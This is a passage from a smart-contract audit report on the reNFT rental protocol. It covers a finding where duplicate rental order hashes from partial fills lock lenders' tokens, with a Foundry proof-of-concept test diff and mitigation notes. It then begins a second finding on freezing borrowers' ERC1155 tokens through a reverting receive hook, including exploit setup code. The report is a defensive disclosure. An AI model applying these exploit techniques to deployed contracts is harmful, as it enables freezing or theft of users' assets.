If the lender creates an offer set to partial, the attacker can lock parts of the lender's assets inside the attacker's safe.

### Proof of Concept

When reNFT zone validates the offer and create the rental, it will calculate order hash using `_deriveRentalOrderHash`, and add the rentals by calling `  STORE.addRentals ` to storage using the calculated hash.

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L592-L595>

<details>

```solidity
    function _rentFromZone(
        RentPayload memory payload,
        SeaportPayload memory seaportPayload
    ) internal {
        // Check: make sure order metadata is valid with the given seaport order zone hash.
        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);

        // Check: verify the fulfiller of the order is an owner of the recipient safe.
        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);

        // Check: verify each execution was sent to the expected destination.
        _executionInvariantChecks(
            seaportPayload.totalExecutions,
            payload.fulfillment.recipient
        );

        // Check: validate and process seaport offer and consideration items based
        // on the order type.
        Item[] memory items = _convertToItems(
            seaportPayload.offer,
            seaportPayload.consideration,
            payload.metadata.orderType
        );

        // PAYEE orders are considered mirror-images of a PAY order. So, PAYEE orders
        // do not need to be processed in the same way that other order types do.
        if (
            payload.metadata.orderType.isBaseOrder() ||
            payload.metadata.orderType.isPayOrder()
        ) {
            // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and
            // the rented amount. From this point on, new memory cannot be safely allocated until the
            // accumulator no longer needs to include elements.
            bytes memory rentalAssetUpdates = new bytes(0);

            // Check if each item is a rental. If so, then generate the rental asset update.
            // Memory will become safe again after this block.
            for (uint256 i; i < items.length; ++i) {
                if (items[i].isRental()) {
                    // Insert the rental asset update into the dynamic array.
                    _insert(
                        rentalAssetUpdates,
                        items[i].toRentalId(payload.fulfillment.recipient),
                        items[i].amount
                    );
                }
            }

            // Generate the rental order.
            RentalOrder memory order = RentalOrder({
                seaportOrderHash: seaportPayload.orderHash,
                items: items,
                hooks: payload.metadata.hooks,
                orderType: payload.metadata.orderType,
                lender: seaportPayload.offerer,
                renter: payload.intendedFulfiller,
                rentalWallet: payload.fulfillment.recipient,
                startTimestamp: block.timestamp,
                endTimestamp: block.timestamp + payload.metadata.rentDuration
            });

            // Compute the order hash.
>>>         bytes32 orderHash = _deriveRentalOrderHash(order);

            // Interaction: Update storage only if the order is a Base Order or Pay order.
>>>         STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates));

            // Interaction: Increase the deposit value on the payment escrow so
            // it knows how many tokens were sent to it.
            for (uint256 i = 0; i < items.length; ++i) {
                if (items[i].isERC20()) {
                    ESCRW.increaseDeposit(items[i].token, items[i].amount);
                }
            }

            // Interaction: Process the hooks associated with this rental.
            if (payload.metadata.hooks.length > 0) {
                _addHooks(
                    payload.metadata.hooks,
                    seaportPayload.offer,
                    payload.fulfillment.recipient
                );
            }

            // Emit rental order started.
            _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);
        }
    }
```

</details>

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L162-L195>

<details>

```solidity
    function _deriveRentalOrderHash(
        RentalOrder memory order
    ) internal view returns (bytes32) {
        // Create arrays for items and hooks.
        bytes32[] memory itemHashes = new bytes32[](order.items.length);
        bytes32[] memory hookHashes = new bytes32[](order.hooks.length);

        // Iterate over each item.
        for (uint256 i = 0; i < order.items.length; ++i) {
            // Hash the item.
            itemHashes[i] = _deriveItemHash(order.items[i]);
        }

        // Iterate over each hook.
        for (uint256 i = 0; i < order.hooks.length; ++i) {
            // Hash the hook.
            hookHashes[i] = _deriveHookHash(order.hooks[i]);
        }

        return
            keccak256(
                abi.encode(
                    _RENTAL_ORDER_TYPEHASH,
                    order.seaportOrderHash,
                    keccak256(abi.encodePacked(itemHashes)),
                    keccak256(abi.encodePacked(hookHashes)),
                    order.orderType,
                    order.lender,
                    order.renter,
                    order.startTimestamp,
                    order.endTimestamp
                )
            );
    }
```
</details>


The problem is that if a lender's offer is created to support partial fills, the attacker can create multiple similar orders referring to the same `seaportPayload.orderHash`. Because the similar orders result in the same hash, the amount of assets that will be returned to the attacker for that hash will be only equal to the `items[i].amount` value of the order, while the remaining assets will be locked. Because the second time lender call `stopRent` it will revert caused by the rental status already removed.

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L216-L235>

```solidity
    function removeRentals(
        bytes32 orderHash,
        RentalAssetUpdate[] calldata rentalAssetUpdates
    ) external onlyByProxy permissioned {
        // The order must exist to be deleted.
        if (!orders[orderHash]) {
>>>         revert Errors.StorageModule_OrderDoesNotExist(orderHash);
        } else {
            // Delete the order from storage.
            delete orders[orderHash];
        }

        // Process each rental asset.
        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
            RentalAssetUpdate memory asset = rentalAssetUpdates[i];

            // Reduce the amount of tokens for the particular rental ID.
            rentedAssets[asset.rentalId] -= asset.amount;
        }
    }
```

Example Scenario :

Alice create `PAY` Offer that support partial fills consist of 2 ERC1155 and 100 ERC20 token A for the provided duration.

Bob fills the offer, by creating two similar partial fills, 1 ERC1155 and 50 ERC20.

Because the two offer result in the same order hash, when alice want to stop the rent, alice will only get 1 ERC1155 and 50 ERC20.

Coded PoC :

Modify the test files to the following :

<Details>

```diff
diff --git a/test/fixtures/engine/OrderCreator.sol b/test/fixtures/engine/OrderCreator.sol
index 6cf6050..a4791d4 100644
--- a/test/fixtures/engine/OrderCreator.sol
+++ b/test/fixtures/engine/OrderCreator.sol
@@ -64,9 +64,10 @@ contract OrderCreator is BaseProtocol {
 
         // Define a standard OrderComponents struct which is ready for
         // use with the Create Policy and the protocol conduit contract
+        // PARTIAL_RESTRICTED from FULL_RESTRICTED
         OrderComponentsLib
             .empty()
-            .withOrderType(SeaportOrderType.FULL_RESTRICTED)
+            .withOrderType(SeaportOrderType.PARTIAL_RESTRICTED)
             .withZone(address(create))
             .withStartTime(block.timestamp)
             .withEndTime(block.timestamp + 100)
diff --git a/test/fixtures/engine/OrderFulfiller.sol b/test/fixtures/engine/OrderFulfiller.sol
index d61448a..5f12d23 100644
--- a/test/fixtures/engine/OrderFulfiller.sol
+++ b/test/fixtures/engine/OrderFulfiller.sol
@@ -113,6 +113,54 @@ contract OrderFulfiller is OrderCreator {
         );
     }
 
+    function createOrderFulfillmentPartial(
+        ProtocolAccount memory _fulfiller,
+        Order memory order,
+        bytes32 orderHash,
+        OrderMetadata memory metadata
+    ) internal {
+        // set the fulfiller account
+        fulfiller = _fulfiller;
+
+        // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via
+        // `matchAdvancedOrders`, then any unspent offer items will go to this address as well
+        seaportRecipient = address(_fulfiller.safe);
+
+        // get a pointer to a new order to fulfill
+        OrderToFulfill storage orderToFulfill = ordersToFulfill.push();
+
+        // create an order fulfillment
+        OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));
+
+        // add the order hash and fulfiller
+        orderToFulfill.orderHash = orderHash;
+
+        // create rental zone payload data
+        _createRentalPayload(
+            orderToFulfill.payload,
+            RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)
+        );
+
+        // generate the signature for the payload
+        bytes memory signature = _signProtocolOrder(
+            rentalSigner.privateKey,
+            create.getRentPayloadHash(orderToFulfill.payload)
+        );
+
+        // create an advanced order from the order. Pass the rental
+        // payload as extra data
+        _createAdvancedOrder(
+            orderToFulfill.advancedOrder,
+            AdvancedOrder(
+                order.parameters,
+                1,
+                2,
+                order.signature,
+                abi.encode(orderToFulfill.payload, signature)
+            )
+        );
+    }
+
     function _createOrderFulfiller(
         ProtocolAccount storage storageFulfiller,
         ProtocolAccount memory _fulfiller
@@ -323,6 +371,96 @@ contract OrderFulfiller is OrderCreator {
         }
     }
 
+    function _createRentalOrderPartial(
+        OrderToFulfill memory orderToFulfill
+    ) internal view returns (RentalOrder memory rentalOrder) {
+        // get the order parameters
+        OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;
+
+        // get the payload
+        RentPayload memory payload = orderToFulfill.payload;
+
+        // get the metadata
+        OrderMetadata memory metadata = payload.metadata;
+
+        // construct a rental order
+        rentalOrder = RentalOrder({
+            seaportOrderHash: orderToFulfill.orderHash,
+            items: new Item[](parameters.offer.length + parameters.consideration.length),
+            hooks: metadata.hooks,
+            orderType: metadata.orderType,
+            lender: parameters.offerer,
+            renter: payload.intendedFulfiller,
+            rentalWallet: payload.fulfillment.recipient,
+            startTimestamp: block.timestamp,
+            endTimestamp: block.timestamp + metadata.rentDuration
+        });
+
+        // for each new offer item being rented, create a new item struct to add to the rental order
+        for (uint256 i = 0; i < parameters.offer.length; i++) {
+            // PAYEE orders cannot have offer items
+            require(
+                metadata.orderType != OrderType.PAYEE,
+                "TEST: cannot have offer items in PAYEE order"
+            );
+
+            // get the offer item
+            OfferItem memory offerItem = parameters.offer[i];
+
+            // determine the item type
+            ItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);
+
+            // determine which entity the payment will settle to
+            SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20
+                ? SettleTo.RENTER
+                : SettleTo.LENDER;
+
+            // create a new rental item
+            rentalOrder.items[i] = Item({
+                itemType: itemType,
+                settleTo: settleTo,
+                token: offerItem.token,
+                amount: offerItem.startAmount / 2,
+                identifier: offerItem.identifierOrCriteria
+            });
+        }
+
+        // for each consideration item in return, create a new item struct to add to the rental order
+        for (uint256 i = 0; i < parameters.consideration.length; i++) {
+            // PAY orders cannot have consideration items
+            require(
+                metadata.orderType != OrderType.PAY,
+                "TEST: cannot have consideration items in PAY order"
+            );
+
+            // get the offer item
+            ConsiderationItem memory considerationItem = parameters.consideration[i];
+
+            // determine the item type
+            ItemType itemType = _seaportItemTypeToRentalItemType(
+                considerationItem.itemType
+            );
+
+            // determine which entity the payment will settle to
+            SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&
+                considerationItem.itemType == SeaportItemType.ERC20
+                ? SettleTo.RENTER
+                : SettleTo.LENDER;
+
+            // calculate item index offset
+            uint256 itemIndex = i + parameters.offer.length;
+
+            // create a new payment item
+            rentalOrder.items[itemIndex] = Item({
+                itemType: itemType,
+                settleTo: settleTo,
+                token: considerationItem.token,
+                amount: considerationItem.startAmount,
+                identifier: considerationItem.identifierOrCriteria
+            });
+        }
+    }
+
     function _signProtocolOrder(
         uint256 signerPrivateKey,
         bytes32 payloadHash
@@ -526,20 +664,73 @@ contract OrderFulfiller is OrderCreator {
         }
         // otherwise, expect the relevant event to be emitted.
         else {
-            vm.expectEmit({emitter: address(create)});
-            emit Events.RentalOrderStarted(
-                create.getRentalOrderHash(payRentalOrder),
-                payOrder.payload.metadata.emittedExtraData,
-                payRentalOrder.seaportOrderHash,
-                payRentalOrder.items,
-                payRentalOrder.hooks,
-                payRentalOrder.orderType,
-                payRentalOrder.lender,
-                payRentalOrder.renter,
-                payRentalOrder.rentalWallet,
-                payRentalOrder.startTimestamp,
-                payRentalOrder.endTimestamp
-            );
+            // vm.expectEmit({emitter: address(create)});
+            // emit Events.RentalOrderStarted(
+            //     create.getRentalOrderHash(payRentalOrder),
+            //     payOrder.payload.metadata.emittedExtraData,
+            //     payRentalOrder.seaportOrderHash,
+            //     payRentalOrder.items,
+            //     payRentalOrder.hooks,
+            //     payRentalOrder.orderType,
+            //     payRentalOrder.lender,
+            //     payRentalOrder.renter,
+            //     payRentalOrder.rentalWallet,
+            //     payRentalOrder.startTimestamp,
+            //     payRentalOrder.endTimestamp
+            // );
+        }
+
+        // the offerer of the PAYEE order fulfills the orders.
+        vm.prank(fulfiller.addr);
+
+        // fulfill the orders
+        seaport.matchAdvancedOrders(
+            _deconstructOrdersToFulfill(),
+            new CriteriaResolver[](0),
+            seaportMatchOrderFulfillments,
+            seaportRecipient
+        );
+
+        // clear structs
+        resetFulfiller();
+        resetOrdersToFulfill();
+        resetSeaportMatchOrderFulfillments();
+    }
+
+    function _finalizePayOrderFulfillmentPartial(
+        bytes memory expectedError
+    )
+        private
+        returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
+    {
+        // get the orders to fulfill
+        OrderToFulfill memory payOrder = ordersToFulfill[0];
+        OrderToFulfill memory payeeOrder = ordersToFulfill[1];
+
+        // create rental orders
+        payRentalOrder = _createRentalOrderPartial(payOrder);
+        payeeRentalOrder = _createRentalOrder(payeeOrder);
+
+        // expect an error if error data was provided
+        if (expectedError.length != 0) {
+            vm.expectRevert(expectedError);
+        }
+        // otherwise, expect the relevant event to be emitted.
+        else {
+            // vm.expectEmit({emitter: address(create)});
+            // emit Events.RentalOrderStarted(
+            //     create.getRentalOrderHash(payRentalOrder),
+            //     payOrder.payload.metadata.emittedExtraData,
+            //     payRentalOrder.seaportOrderHash,
+            //     payRentalOrder.items,
+            //     payRentalOrder.hooks,
+            //     payRentalOrder.orderType,
+            //     payRentalOrder.lender,
+            //     payRentalOrder.renter,
+            //     payRentalOrder.rentalWallet,
+            //     payRentalOrder.startTimestamp,
+            //     payRentalOrder.endTimestamp
+            // );
         }
 
         // the offerer of the PAYEE order fulfills the orders.
@@ -566,6 +757,13 @@ contract OrderFulfiller is OrderCreator {
         (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(""));
     }
 
+    function finalizePayOrderFulfillmentPartial()
+    internal
+    returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
+{
+    (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillmentPartial(bytes(""));
+}
+
     function finalizePayOrderFulfillmentWithError(
         bytes memory expectedError
     )
diff --git a/test/integration/Rent.t.sol b/test/integration/Rent.t.sol
index 6c4c8d3..f20b299 100644
--- a/test/integration/Rent.t.sol
+++ b/test/integration/Rent.t.sol
@@ -13,6 +13,7 @@ import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStruct
 
 import {BaseTest} from "@test/BaseTest.sol";
 import {ProtocolAccount} from "@test/utils/Types.sol";
+import "@forge-std/console.sol";
 
 contract TestRent is BaseTest {
     function test_Success_Rent_BaseOrder_ERC721() public {
@@ -276,6 +277,135 @@ contract TestRent is BaseTest {
         assertEq(erc721s[0].ownerOf(0), address(bob.safe));
     }
 
+    function test_Success_Rent_PayOrder_Partial() public {
+        // create a PAY order
+        createOrder({
+            offerer: alice,
+            orderType: OrderType.PAY,
+            erc721Offers: 0,
+            erc1155Offers: 2,
+            erc20Offers: 1,
+            erc721Considerations: 0,
+            erc1155Considerations: 0,
+            erc20Considerations: 0
+        });
+
+        // finalize the pay order creation
+        (
+            Order memory payOrder,
+            bytes32 payOrderHash,
+            OrderMetadata memory payOrderMetadata
+        ) = finalizeOrder();
+
+        // create a PAYEE order. The fulfiller will be the offerer.
+        createOrder({
+            offerer: bob,
+            orderType: OrderType.PAYEE,
+            erc721Offers: 0,
+            erc1155Offers: 0,
+            erc20Offers: 0,
+            erc721Considerations: 0,
+            erc1155Considerations: 2,
+            erc20Considerations: 1
+        });
+
+        // finalize the pay order creation
+        (
+            Order memory payeeOrder,
+            bytes32 payeeOrderHash,
+            OrderMetadata memory payeeOrderMetadata
+        ) = finalizeOrder();
+
+        // create an order fulfillment for the pay order
+        createOrderFulfillmentPartial({
+            _fulfiller: bob,
+            order: payOrder,
+            orderHash: payOrderHash,
+            metadata: payOrderMetadata
+        });
+
+        // create an order fulfillment for the payee order
+        createOrderFulfillmentPartial({
+            _fulfiller: bob,
+            order: payeeOrder,
+            orderHash: payeeOrderHash,
+            metadata: payeeOrderMetadata
+        });
+
+        // add an amendment to include the seaport fulfillment structs
+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});
+
+        // finalize the order pay/payee order fulfillment
+        (
+            RentalOrder memory payRentalOrder,
+            RentalOrder memory payeeRentalOrder
+        ) = finalizePayOrderFulfillment();
+
+
+        // get the rental order hashes
+        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);
+        bytes32 payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);
+        console.log("first pay rental order : ");
+        console.logBytes32(payRentalOrderHash);
+        console.log("first payee rental order : ");
+        console.logBytes32(payeeRentalOrderHash);
+        // second time - my addition
+        // create an order fulfillment for the pay order
+        createOrderFulfillmentPartial({
+            _fulfiller: bob,
+            order: payOrder,
+            orderHash: payOrderHash,
+            metadata: payOrderMetadata
+        });
+
+        // create an order fulfillment for the payee order
+        createOrderFulfillmentPartial({
+            _fulfiller: bob,
+            order: payeeOrder,
+            orderHash: payeeOrderHash,
+            metadata: payeeOrderMetadata
+        });
+
+        // add an amendment to include the seaport fulfillment structs
+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});
+
+        // finalize the order pay/payee order fulfillment
+        (
+            payRentalOrder,
+            payeeRentalOrder
+        ) = finalizePayOrderFulfillment();
+
+        // get the rental order hashes
+        payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);
+        payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);
+        console.log("second pay rental order : ");
+        console.logBytes32(payRentalOrderHash);
+        console.log("second payee rental order : ");
+        console.logBytes32(payeeRentalOrderHash);
+        // second time - end
+
+        // assert that the rental order was stored
+        assertEq(STORE.orders(payRentalOrderHash), true);
+
+        // assert that the payee rental order was not put in storage
+        assertEq(STORE.orders(payeeRentalOrderHash), false);
+
+        // assert that the token is in storage
+        // assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);
+
+        // assert that the offerer made a payment
+        assertEq(erc20s[0].balanceOf(alice.addr), uint256(9900));
+
+        // assert that a payment was made to the escrow contract
+        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));
+
+        // assert that a payment was synced properly in the escrow contract
+        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));
+
+        // assert that the ERC721 is in the rental wallet of the fulfiller
+        // assertEq(erc721s[0].ownerOf(0), address(bob.safe));
+    }
+
     // This test involves a PAY order where one of the items is left out of the PAYEE order.
     // Instead, the fulfiller attempts to use the `recipient` input parameter on `matchAdvancedOrders`
     // to try to send an asset to an unauthorized address
diff --git a/test/integration/StopRent.t.sol b/test/integration/StopRent.t.sol
index 3d19d3c..0cf67c2 100644
--- a/test/integration/StopRent.t.sol
+++ b/test/integration/StopRent.t.sol
@@ -7,6 +7,8 @@ import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStruct
 
 import {BaseTest} from "@test/BaseTest.sol";
 
+import "@forge-std/console.sol";
+
 contract TestStopRent is BaseTest {
     function test_StopRent_BaseOrder() public {
         // create a BASE order
@@ -245,6 +247,134 @@ contract TestStopRent is BaseTest {
         assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));
     }
 
+    function test_stopRent_payOrder_inFull_stoppedByRenter_Partial() public {
+        // create a PAY order
+        createOrder({
+            offerer: alice,
+            orderType: OrderType.PAY,
+            erc721Offers: 0,
+            erc1155Offers: 2,
+            erc20Offers: 1,
+            erc721Considerations: 0,
+            erc1155Considerations: 0,
+            erc20Considerations: 0
+        });
+
+        // finalize the pay order creation
+        (
+            Order memory payOrder,
+            bytes32 payOrderHash,
+            OrderMetadata memory payOrderMetadata
+        ) = finalizeOrder();
+
+        // create a PAYEE order. The fulfiller will be the offerer.
+        createOrder({
+            offerer: bob,
+            orderType: OrderType.PAYEE,
+            erc721Offers: 0,
+            erc1155Offers: 0,
+            erc20Offers: 0,
+            erc721Considerations: 0,
+            erc1155Considerations: 2,
+            erc20Considerations: 1
+        });
+
+        // finalize the pay order creation
+        (
+            Order memory payeeOrder,
+            bytes32 payeeOrderHash,
+            OrderMetadata memory payeeOrderMetadata
+        ) = finalizeOrder();
+
+        // create an order fulfillment for the pay order
+        createOrderFulfillmentPartial({
+            _fulfiller: bob,
+            order: payOrder,
+            orderHash: payOrderHash,
+            metadata: payOrderMetadata
+        });
+
+        // create an order fulfillment for the payee order
+        createOrderFulfillmentPartial({
+            _fulfiller: bob,
+            order: payeeOrder,
+            orderHash: payeeOrderHash,
+            metadata: payeeOrderMetadata
+        });
+
+        // add an amendment to include the seaport fulfillment structs
+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});
+
+        // finalize the order pay/payee order fulfillment
+        (RentalOrder memory payRentalOrderFirst, ) = finalizePayOrderFulfillmentPartial();
+
+        // get the rental order hashes
+        bytes32 payRentalOrderHashFirst = create.getRentalOrderHash(payRentalOrderFirst);
+        console.log("first pay rental order : ");
+        console.logBytes32(payRentalOrderHashFirst);
+        console.log(STORE.orders(payRentalOrderHashFirst));
+        // second time - my addition
+        // create an order fulfillment for the pay order
+        createOrderFulfillmentPartial({
+            _fulfiller: bob,
+            order: payOrder,
+            orderHash: payOrderHash,
+            metadata: payOrderMetadata
+        });
+
+        // create an order fulfillment for the payee order
+        createOrderFulfillmentPartial({
+            _fulfiller: bob,
+            order: payeeOrder,
+            orderHash: payeeOrderHash,
+            metadata: payeeOrderMetadata
+        });
+
+        // add an amendment to include the seaport fulfillment structs
+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});
+
+        // finalize the order pay/payee order fulfillment
+        (
+            RentalOrder memory payRentalOrderFirstSecond,
+        ) = finalizePayOrderFulfillmentPartial();
+
+        // get the rental order hashes
+        console.log("second pay rental order : ");
+        bytes32 payRentalOrderHashSecond = create.getRentalOrderHash(payRentalOrderFirstSecond);
+        console.logBytes32(payRentalOrderHashSecond);
+        console.log(STORE.orders(payRentalOrderHashSecond));
+        // second time - end
+
+        // speed up in time past the rental expiration
+        vm.warp(block.timestamp + 750);
+
+        // stop the rental order
+        vm.prank(bob.addr);
+        stop.stopRent(payRentalOrderFirst);
+        vm.expectRevert();
+        stop.stopRent(payRentalOrderFirstSecond);
+
+        // assert that the rental order doesnt exist in storage
+        assertEq(STORE.orders(payRentalOrderHashFirst), false);
+
+        // assert that the token is still mark as rented due to amount still exist in storage
+        assertEq(STORE.isRentedOut(address(bob.safe), address(erc1155s[0]), 0), true);
+        assertEq(STORE.isRentedOut(address(bob.safe), address(erc1155s[1]), 0), true);
+
+        // assert that the ERC1155 is back to alice only half of them
+        assertEq(erc1155s[0].balanceOf(address(alice.addr), 0), uint256(50));
+        assertEq(erc1155s[1].balanceOf(address(alice.addr), 0), uint256(50));
+
+        // assert that the offerer made a payment
+        assertEq(erc20s[0].balanceOf(alice.addr), uint256(9900));
+
+        // assert that the fulfiller received the payment
+        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10050));
+
+        // assert that a payment was pulled from the escrow contract
+        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(50));
+    }
+
     function test_stopRent_payOrder_proRata_stoppedByLender() public {
         // create a PAY order
         createOrder({

```

</details>

Run the test :

```shell
forge test -vv --match-contract TestStopRent --match-test test_stopRent_payOrder_inFull_stoppedByRenter_Partial
```

From the test, it can be observed that half of the lender's assets are locked, and the order cannot be stopped even after the rent duration has passed.

### Recommended Mitigation Steps

Introduce nonce when calculating orderHash, to ensure every order will always unique.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/203#issuecomment-1908713503)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/10) - Prevents `RentPayload` replayability and ensures that orders must be unique by disallowing partial orders from seaport.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/8), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/47) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/36).

***
 
# Medium Risk Findings (16)
## [[M-01] A malicious lender can freeze borrower's ERC1155 tokens indefinitely because the guard can't differentiate between rented and non-rented ERC1155 tokens in the borrower's safe.](https://github.com/code-423n4/2024-01-renft-findings/issues/600)
*Submitted by [sin1st3r\_\_](https://github.com/code-423n4/2024-01-renft-findings/issues/600), also found by [jasonxiale](https://github.com/code-423n4/2024-01-renft-findings/issues/372), [evmboi32](https://github.com/code-423n4/2024-01-renft-findings/issues/342), [JCN](https://github.com/code-423n4/2024-01-renft-findings/issues/317), [0xA5DF](https://github.com/code-423n4/2024-01-renft-findings/issues/316), [KupiaSec](https://github.com/code-423n4/2024-01-renft-findings/issues/263), [Jorgect](https://github.com/code-423n4/2024-01-renft-findings/issues/246), [said](https://github.com/code-423n4/2024-01-renft-findings/issues/207), [J4X](https://github.com/code-423n4/2024-01-renft-findings/issues/169), and [kaden](https://github.com/code-423n4/2024-01-renft-findings/issues/124)*

### Pre-requisite knowledge & an overview of the features in question

***

1.  **Gnosis safe guards**: A gnosis guard is a contract that acts as a transaction guard which allows the owner of the safe to limit the contracts and functions that may be called by the multisig owners of the safe. ReNFT has created it's own gnosis guard contract, which is [Guard.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Guard.sol).

    **Example utility**: When you ask reNFT to create a rental safe for you by calling [deployRentalSafe()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L138) in [Factory.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Factory.sol), reNFT creates a rental safe for you and automatically installs it's own guard contract on it. Everytime you send a call from your gnosis safe, this call has to first pass through that guard. If you're for example, trying to move a NFT token you rented using `transferFrom()`, it'll prevent you from doing so. When it intercepts the transaction you're trying to send, it checks for a [list of function signatures](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195) that can be malicious, for example it checks if you're trying to enable/disable a module it has not authorized. It checks if you're trying to change the guard contract address itself, It also checks if you're trying to transfer or approve a rented NFT or ERC1155 token using the most common functions like `approve()`, `safeTransferFrom()`, `transferFrom()`, `setApprovalForAll()`. This guard acts as the single and most important defense line against rented ERC721/1155 token theft.

***

### The Vulnerability & Exploitation Steps

***

The vulnerability exists in the [Guard.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol) contract, [L-242](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L242)

        } else if (selector == e1155_safe_transfer_from_selector) {
            // Load the token ID from calldata.
            uint256 tokenId = uint256(
                _loadValueFromCalldata(data, e1155_safe_transfer_from_token_id_offset)
            );

            // Check if the selector is allowed.
            _revertSelectorOnActiveRental(selector, from, to, tokenId);

The guard does not differentiate between ERC1155 tokens of address of same ID that are actively being rented and those that aren't rented. So for example, you had 2,000 "GameToken" ERC1155 tokens with an id of 5, that are not rented. And you rented 10 "GameToken" ERC1155 tokens of the same id "5", you will not be able to move or transfer the non-rented 2,000 "GameToken" ERC1155 tokens which you had prior to rented the other 10 tokens, until the 10 "GameToken" rental expires and gets stopped/finalized.

The problem is that a malicious lender can exploit this to freeze the borrower's pre-existing funds of the same kind indefinitely by preventing his rental (the rental in which the lender lended ERC1155 tokens to the borrower), from being stopped even if the expiry date of the rental has passed. He can do so by utilizing the fact that the `Reclaimer` contract utilizes `safeTransferFrom` to give the lender his tokens back after the rental gets stopped. The lender can then set up a `onERC1155Receive()` hook that reverts until he decides otherwise. This will prevent the rental from being stopped and therefore, it'll prevent the borrower from transferring his pre-rental tokens, making them indefinitely stuck.

**Proof of concept**

1.  The borrower, Jack, has 1,000 ERC1155 tokens of id 5 that are not rented.
2.  Jack decides to lend 10 ERC1155 tokens of same id, 5, from Alice (malicious lender). Rental period will last 10 days.
3.  Alice (malicious smart contract lender) sets a `onERC1155Receive()` hook which reverts if certain time has not passed
4.  Whenever Jack tries to stop the rental after 10 days have passed by calling `stopRent()`, it will revert.
5.  Jack will not be able to transfer his non-rented 1,000 ERC1155 tokens out of his rental safe until the malicious lender decides otherwise.

***

### Proof of concept code

***

To run the PoC, you'll need to do the following:

1.  You'll need to add the following two files to the test/ folder:
    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts
    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.
2.  You'll need to run this command
    `forge test --match-contract Exploit --match-test test_ERC1155_Freeze_Exploit -vv`

*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one from another PoC run in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure needed for the exploit*

**The files:**

<details>
<summary><b>SetupExploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        ConsiderationItem,
        OfferItem,
        OrderParameters,
        OrderComponents,
        Order,
        AdvancedOrder,
        ItemType,
        ItemType as SeaportItemType,
        CriteriaResolver,
        OrderType as SeaportOrderType,
        Fulfillment,
        FulfillmentComponent
    } from "@seaport-types/lib/ConsiderationStructs.sol";
    import {
        AdvancedOrderLib,
        ConsiderationItemLib,
        FulfillmentComponentLib,
        FulfillmentLib,
        OfferItemLib,
        OrderComponentsLib,
        OrderLib,
        OrderParametersLib,
        SeaportArrays,
        ZoneParametersLib
    } from "@seaport-sol/SeaportSol.sol";

    import {
        OrderMetadata,
        OrderType,
        OrderFulfillment,
        RentPayload,
        RentalOrder,
        Item,
        SettleTo,
        ItemType as RentalItemType
    } from "@src/libraries/RentalStructs.sol";

    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";
    import {OrderMetadata, OrderType, Hook} from "@src/libraries/RentalStructs.sol";
    import {Vm} from "@forge-std/Vm.sol";
